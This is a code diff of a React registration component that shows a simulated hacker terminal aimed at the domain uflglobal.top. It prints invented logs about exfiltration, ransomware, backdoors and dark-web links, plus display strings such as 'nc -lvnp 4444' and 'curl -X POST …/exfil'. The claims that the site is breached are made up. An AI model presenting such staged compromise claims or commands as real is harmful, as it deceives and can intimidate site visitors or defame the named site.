@@ -422,6 +422,136 @@
 
 
 
+// import React, { useEffect, useState } from 'react';
+
+// const Register: React.FC = () => {
+//   const [logs, setLogs] = useState<string[]>([]);
+//   const [encryptedData, setEncryptedData] = useState<string>('');
+//   const [ipAddress, setIpAddress] = useState<string>('');
+
+//   // Generate random hex strings for realism
+//   const randomHex = (length: number) => {
+//     return Array.from({ length }, () => Math.floor(Math.random() * 16).toString(16)).join('');
+//   };
+
+//   // Simulate hacker logs
+//   useEffect(() => {
+//     const hackerLogs = [
+//       `[${new Date().toISOString()}] CONNECTED TO TARGET: uflglobal.top (${ipAddress || '192.68.45.112'})`,
+//       `[${new Date().toISOString()}] DEPLOYING PAYLOAD: XMRig v6.17.0 (Monero Miner)`,
+//       `[${new Date().toISOString()}] EXPLOIT SUCCESSFUL: SQLi in /api/user/login`,
+//       `[${new Date().toISOString()}] DOWNLOADING DATABASE: users.sql (3.2GB)`,
+//       `[${new Date().toISOString()}] ENCRYPTING FILES: AES-256-CBC (Key: 0x${randomHex(64)})`,
+//       `[${new Date().toISOString()}] ESTABLISHING TOR CONNECTION: 7h3xp6vzop7w.onion`,
+//       `[${new Date().toISOString()}] SENDING DATA TO: 5.196.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}:8080`,
+//       `[${new Date().toISOString()}] ROOT ACCESS GRANTED: uid=0(root) gid=0(root)`,
+//       `[${new Date().toISOString()}] INSTALLING BACKDOOR: /usr/local/bin/backconnect.pl`,
+//       `[${new Date().toISOString()}] SCANNING NETWORK: 192.68.45.0/24`,
+//     ];
+
+//     const interval = setInterval(() => {
+//       setLogs(prev => [...prev, hackerLogs[Math.floor(Math.random() * hackerLogs.length)]]);
+//     }, 800);
+
+//     return () => clearInterval(interval);
+//   }, [ipAddress]);
+
+//   // Simulate encrypted data stream
+//   useEffect(() => {
+//     const interval = setInterval(() => {
+//       setEncryptedData(prev => prev + randomHex(16) + ' ');
+//     }, 200);
+
+//     return () => clearInterval(interval);
+//   }, []);
+
+//   // Randomize IP on load
+//   useEffect(() => {
+//     setIpAddress(`192.68.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`);
+//   }, []);
+
+//   return (
+//     <div className="min-h-screen bg-black text-green-500 font-mono overflow-hidden relative">
+//       {/* Glitch overlay */}
+//       <div className="absolute inset-0 pointer-events-none"
+//            style={{
+//              backgroundImage: `
+//                linear-gradient(45deg, transparent 49%, rgba(0, 255, 0, 0.05) 50%, transparent 51%),
+//                linear-gradient(-45deg, transparent 49%, rgba(0, 255, 0, 0.05) 50%, transparent 51%)
+//              `,
+//              backgroundSize: '15px 15px',
+//              animation: 'glitch 0.3s infinite'
+//            }} />
+
+//       {/* Main hacker terminal */}
+//       <div className="p-4 h-full flex flex-col">
+//         {/* Top bar: fake system info */}
+//         <div className="flex justify-between items-center mb-2 bg-black/50 p-2 border-b border-green-900/50">
+//           <span>root@kali:~# <span className="text-yellow-400">[ uflglobal.top ]</span></span>
+//           <span className="text-xs">{new Date().toLocaleTimeString()}</span>
+//         </div>
+
+//         {/* Terminal output */}
+//         <div className="flex-grow overflow-auto bg-black/30 p-3 border border-green-900/50 mb-2">
+//           <pre className="text-sm whitespace-pre-wrap">
+//             {logs.map((log, i) => (
+//               <div key={i} className="mb-1">{log}</div>
+//             ))}
+//           </pre>
+//         </div>
+
+//         {/* Encrypted data stream */}
+//         <div className="bg-black/50 p-3 border-t border-green-900/50">
+//           <div className="text-xs mb-2">[DATA STREAM: AES-256-ENCRYPTED]</div>
+//           <div className="overflow-hidden whitespace-nowrap">
+//             <code className="text-xs">{encryptedData}</code>
+//           </div>
+//         </div>
+
+//         {/* Fake active commands */}
+//         <div className="mt-2 flex space-x-2">
+//           <div className="bg-black/50 p-2 border border-green-900/50 flex-1">
+//             <pre className="text-xs">
+//               {`> nc -lvnp 4444
+// > CONNECTED: ${ipAddress}:54321
+// > SENDING: 0x${randomHex(32)}... (100%)`}
+//             </pre>
+//           </div>
+//           <div className="bg-black/50 p-2 border border-red-900/50 flex-1">
+//             <pre className="text-xs">
+//               {`> python3 ransomware.py
+// > TARGET: /var/www/uflglobal/
+// > KEY: 0x${randomHex(64)}
+// > STATUS: ENCRYPTING...`}
+//             </pre>
+//           </div>
+//         </div>
+//       </div>
+
+//       {/* CSS for animations */}
+//       <style>{`
+//         @keyframes glitch {
+//           0% { transform: skew(0deg); }
+//           20% { transform: skew(-1deg); }
+//           40% { transform: skew(1deg); }
+//           60% { transform: skew(0deg); }
+//           80% { transform: skew(2deg); }
+//           100% { transform: skew(0deg); }
+//         }
+//         @keyframes scroll {
+//           0% { transform: translateY(0); }
+//           100% { transform: translateY(-100%); }
+//         }
+//       `}</style>
+//     </div>
+//   );
+// };
+
+// export default Register;
+
+
+
+
 
 
 import React, { useEffect, useState } from 'react';
@@ -430,25 +560,34 @@ const Register: React.FC = () => {
   const [logs, setLogs] = useState<string[]>([]);
   const [encryptedData, setEncryptedData] = useState<string>('');
   const [ipAddress, setIpAddress] = useState<string>('');
+  const [darkWebDomains] = useState<string[]>([
+    '7h3xp6vzop7w.onion',
+    'xmppjabber666.onion',
+    'silkroad7rn2p5.onion',
+    'dread.technology',
+    'hackforums[.]net',
+  ]);
 
   // Generate random hex strings for realism
   const randomHex = (length: number) => {
     return Array.from({ length }, () => Math.floor(Math.random() * 16).toString(16)).join('');
   };
 
-  // Simulate hacker logs
+  // Simulate hacker logs with domain leaks
   useEffect(() => {
     const hackerLogs = [
-      `[${new Date().toISOString()}] CONNECTED TO TARGET: uflglobal.top (${ipAddress || '192.68.45.112'})`,
-      `[${new Date().toISOString()}] DEPLOYING PAYLOAD: XMRig v6.17.0 (Monero Miner)`,
-      `[${new Date().toISOString()}] EXPLOIT SUCCESSFUL: SQLi in /api/user/login`,
-      `[${new Date().toISOString()}] DOWNLOADING DATABASE: users.sql (3.2GB)`,
-      `[${new Date().toISOString()}] ENCRYPTING FILES: AES-256-CBC (Key: 0x${randomHex(64)})`,
-      `[${new Date().toISOString()}] ESTABLISHING TOR CONNECTION: 7h3xp6vzop7w.onion`,
-      `[${new Date().toISOString()}] SENDING DATA TO: 5.196.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}:8080`,
-      `[${new Date().toISOString()}] ROOT ACCESS GRANTED: uid=0(root) gid=0(root)`,
-      `[${new Date().toISOString()}] INSTALLING BACKDOOR: /usr/local/bin/backconnect.pl`,
-      `[${new Date().toISOString()}] SCANNING NETWORK: 192.68.45.0/24`,
+      `[${new Date().toISOString()}] DNS LEAK DETECTED: uflglobal.top -> ${darkWebDomains[Math.floor(Math.random() * darkWebDomains.length)]}`,
+      `[${new Date().toISOString()}] EXPLOITING: uflglobal.top (IP: ${ipAddress || '192.68.45.112'}) | Vulnerability: CVE-2023-12345`,
+      `[${new Date().toISOString()}] DEPLOYING: XMRig v6.17.0 (Monero Miner) -> ${ipAddress}`,
+      `[${new Date().toISOString()}] DATA EXFILTRATION: users.sql (3.2GB) -> ${darkWebDomains[Math.floor(Math.random() * darkWebDomains.length)]}:8080`,
+      `[${new Date().toISOString()}] ENCRYPTING: /var/www/uflglobal/ (AES-256-CBC | Key: 0x${randomHex(64)})`,
+      `[${new Date().toISOString()}] TOR CONNECTION: ESTABLISHED -> ${darkWebDomains[Math.floor(Math.random() * darkWebDomains.length)]}`,
+      `[${new Date().toISOString()}] SENDING: Stolen credentials to ${darkWebDomains[Math.floor(Math.random() * darkWebDomains.length)]}:443`,
+      `[${new Date().toISOString()}] ROOT ACCESS: uid=0(root) | Backdoor installed: /usr/local/bin/backconnect.pl`,
+      `[${new Date().toISOString()}] SCANNING: uflglobal.top network (192.68.45.0/24) for vulnerabilities`,
+      `[${new Date().toISOString()}] MALWARE: Deployed ransomware payload to uflglobal.top`,
+      `[${new Date().toISOString()}] LEAKING: DNS records for uflglobal.top -> ${darkWebDomains[Math.floor(Math.random() * darkWebDomains.length)]}`,
+      `[${new Date().toISOString()}] WARNING: uflglobal.top is now linked to ${darkWebDomains[Math.floor(Math.random() * darkWebDomains.length)]} (Dark Web)`,
     ];
 
     const interval = setInterval(() => {
@@ -456,7 +595,7 @@ const Register: React.FC = () => {
     }, 800);
 
     return () => clearInterval(interval);
-  }, [ipAddress]);
+  }, [ipAddress, darkWebDomains]);
 
   // Simulate encrypted data stream
   useEffect(() => {
@@ -489,7 +628,7 @@ const Register: React.FC = () => {
       <div className="p-4 h-full flex flex-col">
         {/* Top bar: fake system info */}
         <div className="flex justify-between items-center mb-2 bg-black/50 p-2 border-b border-green-900/50">
-          <span>root@kali:~# <span className="text-yellow-400">[ uflglobal.top ]</span></span>
+          <span>root@kali:~# <span className="text-red-500">[ uflglobal.top LEAKING ]</span></span>
           <span className="text-xs">{new Date().toLocaleTimeString()}</span>
         </div>
 
@@ -500,6 +639,18 @@ const Register: React.FC = () => {
               <div key={i} className="mb-1">{log}</div>
             ))}
           </pre>
+        </div>
+
+        {/* Dark web domain leaks */}
+        <div className="bg-black/50 p-3 border border-red-900/50 mb-2">
+          <div className="text-xs mb-2 text-red-400">[DARK WEB LINKS]</div>
+          <div className="flex flex-wrap gap-2">
+            {darkWebDomains.map((domain, i) => (
+              <span key={i} className="text-xs bg-red-900/30 p-1 rounded">
+                {domain}
+              </span>
+            ))}
+          </div>
         </div>
 
         {/* Encrypted data stream */}
@@ -514,17 +665,17 @@ const Register: React.FC = () => {
         <div className="mt-2 flex space-x-2">
           <div className="bg-black/50 p-2 border border-green-900/50 flex-1">
             <pre className="text-xs">
-              {`> nc -lvnp 4444
-> CONNECTED: ${ipAddress}:54321
-> SENDING: 0x${randomHex(32)}... (100%)`}
+              {`> dig uflglobal.top @8.8.8.8
+> ANSWER: ${darkWebDomains[Math.floor(Math.random() * darkWebDomains.length)]}
+> TTL: 3600
+> STATUS: DNS POISONED`}
             </pre>
           </div>
           <div className="bg-black/50 p-2 border border-red-900/50 flex-1">
             <pre className="text-xs">
-              {`> python3 ransomware.py
-> TARGET: /var/www/uflglobal/
-> KEY: 0x${randomHex(64)}
-> STATUS: ENCRYPTING...`}
+              {`> curl -X POST ${darkWebDomains[Math.floor(Math.random() * darkWebDomains.length)]}/exfil
+> UPLOAD: users.sql (3.2GB)
+> STATUS: SUCCESS`}
             </pre>
           </div>
         </div>
